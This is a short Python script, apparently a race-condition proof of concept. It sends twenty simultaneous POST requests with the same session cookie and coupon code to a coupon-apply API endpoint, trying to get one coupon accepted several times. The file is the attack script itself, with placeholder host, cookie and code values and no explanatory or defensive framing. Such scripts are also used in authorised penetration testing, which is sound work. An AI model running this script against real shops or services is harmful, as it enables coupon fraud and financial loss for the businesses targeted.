import aiohttp
import asyncio

async def fetch(url, session, headers, data):
    async with session.post(url, json=data, headers=headers) as response:
        return await response.text()

async def main():
    headers = {
        "Content-Type": "application/json",
        "Cookie": "session=sessiontoken"
    }
    data = {"coupon_code": "somecouponcode"}
    target_url = "http://0.0.0.0/api/coupons/apply"
    num_requests = 20

    async with aiohttp.ClientSession() as session:
        tasks = [fetch(target_url, session, headers, data) for _ in range(num_requests)]
        responses = await asyncio.gather(*tasks)

        for idx, response_text in enumerate(responses):
            print(f"Response {idx + 1}: {response_text[:100]}...")

if __name__ == "__main__":
    asyncio.run(main())

